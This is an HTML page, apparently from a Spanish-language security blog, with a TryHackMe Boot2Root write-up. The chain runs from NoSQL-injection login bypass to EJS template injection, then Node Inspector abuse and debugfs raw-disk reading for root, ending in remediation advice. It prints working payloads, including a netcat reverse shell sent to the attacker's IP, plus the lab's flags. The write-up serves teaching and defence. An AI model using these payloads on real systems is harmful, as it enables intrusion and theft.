@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 7 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Web / Boot2Root / Privilege Escalation</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">Critical</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-05</div>
+      </div>
+    </div>
+
+    <h1>Byte Lotus — Poolside: NoSQL Injection + SSTI (EJS) + Node Inspector Abuse → Root</h1>
+    <p class="dek">Cadena de compromiso total en un reto Boot2Root: bypass de autenticación por NoSQL Injection contra NeDB, ejecución remota de código vía Server-Side Template Injection en EJS, y escalada a root abusando de un puerto de debugging del Node.js Inspector Protocol expuesto localmente, combinado con membresía en el grupo <code>disk</code> para lectura cruda del disco.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El objetivo era un reto Boot2Root temático de una plataforma de reservas junto a la pileta del resort, "Byte Lotus — Poolside". El briefing de la sala insinuaba sesiones secuestradas, transacciones de wallet no autorizadas y la presencia de un atacante ya dentro del sistema. El objetivo: obtener la user flag y la root flag.</p>
+    <p>Un escaneo con Nmap reveló únicamente dos puertos abiertos: SSH (22) y un servicio HTTP (80) corriendo sobre Node.js con middleware Express.</p>
+    <pre><code>nmap -sC -sV -F 10.65.155.92
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
+80/tcp open  http    Node.js (Express middleware)
+|_http-title: Byte Lotus — Poolside</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-nmap-scan.png" alt="Escaneo nmap mostrando SSH y HTTP Node.js/Express">
+      <figcaption>Fig. 1 — Escaneo Nmap: solo SSH (22) y HTTP Node.js/Express (80) expuestos.</figcaption>
+    </figure>
+
+    <p>La página de inicio mostraba un formulario de login simple ("Staff / Guest ID" + "Passphrase"), renderizado del lado del servidor sin JavaScript en el cliente. El brute-forcing de directorios confirmó dos rutas adicionales reales: <code>/staff</code> (403 Forbidden — existe pero requiere sesión) y <code>/logout</code> (redirect 302 — confirma manejo de sesión basado en cookies).</p>
+
+    <figure>
+      <img src="../assets/img/Day7-login-source.png" alt="Código fuente de la página de login de Byte Lotus Poolside">
+      <figcaption>Fig. 2 — Vista de código fuente de la página de login.</figcaption>
+    </figure>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Se identificaron <strong>tres vulnerabilidades encadenables</strong> a lo largo de la cadena de ataque:</p>
+    <ul>
+      <li><strong>NoSQL Injection en el login:</strong> el backend usaba NeDB, un datastore basado en archivos con operadores de consulta estilo MongoDB. El endpoint <code>/login</code> aceptaba cuerpos <code>application/json</code> sin validar el tipo de dato de los campos, permitiendo enviar un operador (<code>{"$ne": null}</code>) en lugar de un string.</li>
+      <li><strong>Server-Side Template Injection (SSTI) en EJS:</strong> la consola de staff exponía un campo de "Confirmation template" documentado explícitamente como EJS. El servidor renderizaba el input del atacante con <code>ejs.render()</code> sin sandboxing, permitiendo ejecución de JavaScript arbitrario y, desde ahí, comandos del sistema operativo.</li>
+      <li><strong>Node.js Inspector Protocol expuesto:</strong> un puerto de debugging (<code>127.0.0.1:9229</code>) quedó abierto en un proceso separado corriendo como un usuario de servicio distinto y más privilegiado, alcanzable una vez obtenida ejecución de código en el host.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> Ninguna de las tres fallas por sí sola alcanzaba para comprometer el sistema completo. La NoSQL injection solo otorgaba una sesión de staff; la SSTI requería esa sesión previa; y el Inspector Protocol, aunque crítico, estaba atado a localhost y solo era alcanzable una vez lograda la RCE inicial. El compromiso total dependía de encadenar las tres.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Bypass de autenticación por NoSQL Injection.</strong> Interceptando el POST de login con Burp Suite se confirmó que el backend aceptaba cuerpos JSON. Enviando un operador <code>$ne</code> en lugar de un string en el campo de contraseña se evitó por completo la verificación de credenciales:</p>
+    <pre><code>curl -s -X POST http://10.65.155.92/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
+
+{"ok":true,"role":"guest"}</code></pre>
+    <p>Probando distintos nombres de usuario se confirmó <code>attendant</code> como cuenta válida con rol <code>staff</code>, mientras que <code>admin</code> y <code>staff</code> como usernames literales no existían:</p>
+    <pre><code>curl -s -X POST http://10.65.155.92/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"attendant","password":{"$ne":null}}' \
+  -c cookies.txt
+
+{"ok":true,"role":"staff"}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-nosqli-burp.png" alt="Inyección NoSQL contra /login autenticando como attendant con rol staff">
+      <figcaption>Fig. 3 — NoSQL injection contra /login: attendant autentica con rol "staff" (200 OK).</figcaption>
+    </figure>
+
+    <figure>
+      <img src="../assets/img/Day7-session-cookie.png" alt="Cookie de sesión obtenida, /staff devuelve 200 en vez de 403">
+      <figcaption>Fig. 4 — Cookie de sesión obtenida; /staff ahora devuelve 200 en lugar de 403.</figcaption>
+    </figure>
+
+    <p><strong>Paso 2 — SSTI en el campo de template (EJS) → confirmación.</strong> La consola de staff ("Cabana Desk") exponía un campo de "Confirmation template" documentado como EJS (<code>&lt;%= guest %&gt;</code>). Un payload aritmético confirmó la inyección:</p>
+    <pre><code># Payload de confirmación
+<%= 7*7 %>
+→ La respuesta del servidor devuelve: 49</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-nosqli-additional-tests.png" alt="Pruebas adicionales confirmando el bypass de autenticación por NoSQL injection">
+      <figcaption>Fig. 5 — Pruebas adicionales del bypass: intentos con admin fallan (401), attendant con {$ne:null} responde 200 y establece sesión de staff.</figcaption>
+    </figure>
+
+    <p><strong>Paso 3 — Escalada a RCE.</strong> Dado que EJS ejecuta JavaScript arbitrario al renderizar, se escaló la SSTI a ejecución de comandos del sistema operativo usando <code>global.process.mainModule.require('child_process').execSync()</code>, y desde ahí a una reverse shell (lanzada como proceso en background para no bloquear el event loop de Node):</p>
+    <pre><code># Listener en la máquina atacante
+nc -lvnp 4444
+
+# Payload enviado al campo de template (POST /staff/preview)
+curl -s -b cookies.txt -X POST http://10.65.155.92/staff/preview \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data-urlencode 'template=<%= global.process.mainModule.require("child_process").execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.136.224 4444 >/tmp/f").toString() %>'</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-reverse-shell.png" alt="Reverse shell establecida, whoami confirma usuario poolside">
+      <figcaption>Fig. 6 — Reverse shell establecida; whoami confirma el usuario poolside.</figcaption>
+    </figure>
+
+    <p><strong>Paso 4 — User flag.</strong> Con la shell activa como <code>poolside</code> (uid=996) se localizó la flag en el home del usuario:</p>
+    <pre><code>poolside@tryhackme-2404:/opt/poolside$ find / -name "user.txt" 2>/dev/null
+/home/poolside/user.txt
+
+poolside@tryhackme-2404:/opt/poolside$ cat /home/poolside/user.txt
+THM{w4rm_s3ss10n_h1j4ck3d}</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-user-flag.png" alt="user.txt localizado en /home/poolside/">
+      <figcaption>Fig. 7 — user.txt localizado en /home/poolside/.</figcaption>
+    </figure>
+
+    <div class="callout"><strong>User flag:</strong> <code>THM{w4rm_s3ss10n_h1j4ck3d}</code></div>
+
+    <p><strong>Paso 5 — Escalada de privilegios: Node Inspector Protocol expuesto.</strong> La enumeración estándar de privesc (binarios SUID, capabilities, cron jobs) no arrojó nada explotable. Revisando sockets en escucha se encontró el Node.js Inspector Protocol vinculado a <code>127.0.0.1:9229</code> — un puerto de debugging dejado abierto en un proceso separado, corriendo como otra cuenta de servicio con más privilegios: <code>pipelinesvc</code> (uid=995), miembro del grupo <code>disk</code>.</p>
+    <pre><code>poolside@tryhackme-2404:/opt/poolside$ ss -tulpn 2>/dev/null | grep 9229
+tcp   LISTEN 0   511   127.0.0.1:9229   0.0.0.0:*
+
+poolside@tryhackme-2404:/opt/poolside$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+debug> repl
+Press Ctrl+C to leave debug repl
+> process.getuid()
+995
+> process.getBuiltinModule('child_process').execSync('id').toString()
+'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-node-inspector-connect.png" alt="Conexión al REPL expuesto del Node Inspector en 127.0.0.1:9229">
+      <figcaption>Fig. 8 — Conexión al REPL expuesto del Node Inspector en 127.0.0.1:9229.</figcaption>
+    </figure>
+
+    <figure>
+      <img src="../assets/img/Day7-node-inspector-exec.png" alt="Ejecución de código confirmada como pipelinesvc, miembro del grupo disk">
+      <figcaption>Fig. 9 — Ejecución de código confirmada como pipelinesvc (uid=995), miembro del grupo disk.</figcaption>
+    </figure>
+
+    <p><strong>Paso 6 — Root flag vía acceso crudo al disco.</strong> La membresía en el grupo <code>disk</code> otorga acceso de lectura a dispositivos de bloque crudos, saltándose las verificaciones normales de permisos del sistema de archivos. Tras identificar <code>/dev/nvme0n1p1</code> como la partición raíz, se usó <code>debugfs</code> (un debugger de sistemas de archivos ext4) para leer <code>/root/root.txt</code> directamente desde la partición cruda — sin necesitar una shell como root:</p>
+    <pre><code>> process.getBuiltinModule('child_process').execSync('ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true').toString()
+
+'crw------- 1 root root  10, 236 ... /dev/mapper/control\n' +
+'crw-rw---- 1 root disk 259,   0 ... /dev/nvme0\n' +
+'brw-rw---- 1 root disk 259,   1 ... /dev/nvme0n1\n' +
+'brw-rw---- 1 root disk 259,   2 ... /dev/nvme0n1p1\n'
+
+> process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs',
+    ['-R', 'cat /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
+
+'THM{r4w_d1sk_4cc3ss_w4s_t00_much}\n'</code></pre>
+
+    <figure>
+      <img src="../assets/img/Day7-disk-partition.png" alt="Partición del sistema de archivos raíz identificada: /dev/nvme0n1p1">
+      <figcaption>Fig. 10 — Partición del sistema de archivos raíz identificada: /dev/nvme0n1p1.</figcaption>
+    </figure>
+
+    <figure>
+      <img src="../assets/img/Day7-root-flag-debugfs.png" alt="root.txt leído directamente del disco crudo vía debugfs">
+      <figcaption>Fig. 11 — root.txt leído directamente del disco crudo vía debugfs.</figcaption>
+    </figure>
+
+    <div class="callout"><strong>Root flag:</strong> <code>THM{r4w_d1sk_4cc3ss_w4s_t00_much}</code></div>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena completa resultó en compromiso total del sistema, sin necesidad de obtener nunca una shell interactiva como root:</p>
+    <ul>
+      <li><strong>Recon (Nmap):</strong> SSH + Node/Express HTTP identificados.</li>
+      <li><strong>Enumeración (brute-force de directorios):</strong> rutas /staff y /logout descubiertas.</li>
+      <li><strong>Auth bypass (NoSQL Injection, NeDB {$ne:null}):</strong> autenticado como "attendant" / rol staff.</li>
+      <li><strong>Foothold (SSTI en EJS → RCE):</strong> ejecución de código como poolside.</li>
+      <li><strong>Privesc recon (sockets en escucha):</strong> Node Inspector (9229) accesible como pipelinesvc.</li>
+      <li><strong>Privesc (node inspect → grupo disk → debugfs):</strong> lectura de /root/root.txt desde disco crudo.</li>
+    </ul>
+    <p>El impacto es <em>critical</em>: un atacante sin cuenta previa puede pasar de un formulario de login público a lectura arbitraria de archivos del sistema como root, encadenando tres fallas de configuración y desarrollo independientes. En un entorno real, esto equivale a compromiso total de la infraestructura — incluyendo la base de datos de reservas, wallets de huéspedes y cualquier secreto almacenado en el filesystem.</p>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Validar y coercionar tipos en queries a base de datos:</strong> nunca construir consultas directamente desde el body de una request sin validar. Rechazar valores no-string en campos como username/password antes de pasarlos al motor de queries, para prevenir NoSQL injection.</li>
+      <li><strong>No renderizar input de usuario como template ejecutable:</strong> si se necesita personalización de texto, usar interpolación de strings simple o un motor sandboxeado. Nunca pasar input del usuario a <code>ejs.render()</code> (o equivalente) tratándolo como código.</li>
+      <li><strong>Deshabilitar interfaces de debugging en producción:</strong> el Node.js Inspector Protocol (y herramientas de debugging equivalentes) nunca deben estar habilitadas en producción, ni siquiera vinculadas a localhost, ya que cualquier RCE en el host puede alcanzarlas.</li>
+      <li><strong>Principio de mínimo privilegio en cuentas de servicio:</strong> la membresía en el grupo <code>disk</code> equivale a acceso de lectura a nivel root sobre el filesystem completo y debe evitarse salvo necesidad estrictamente justificada.</li>
+      <li><strong>Segmentar procesos y cuentas de servicio:</strong> procesos con distintos niveles de confianza no deberían compartir host ni ser alcanzables entre sí sin controles adicionales.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto es un ejemplo claro de cómo tres vulnerabilidades de severidad moderada por separado —una inyección de autenticación, un motor de templates sin sandboxing, y un puerto de debugging olvidado— se combinan para producir un compromiso total del sistema. Ninguna de las tres, aislada, hubiera bastado: la NoSQL injection solo daba una sesión de bajo privilegio, la SSTI requería esa sesión previa, y el Inspector Protocol solo era alcanzable una vez lograda ejecución de código en el host.</p>
+    <p>También refuerza un principio de higiene operacional poco discutido: las herramientas de debugging (inspectors, REPLs remotos, endpoints de introspección) son, en la práctica, backdoors legítimos cuando quedan expuestas — incluso si están atadas a localhost, porque cualquier RCE previo en el mismo host las vuelve alcanzables. Y la lectura cruda de disco vía <code>debugfs</code> es un recordatorio de que "root" no es la única forma de leer archivos protegidos: cualquier proceso con acceso al dispositivo de bloque subyacente puede saltarse por completo los permisos del filesystem.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
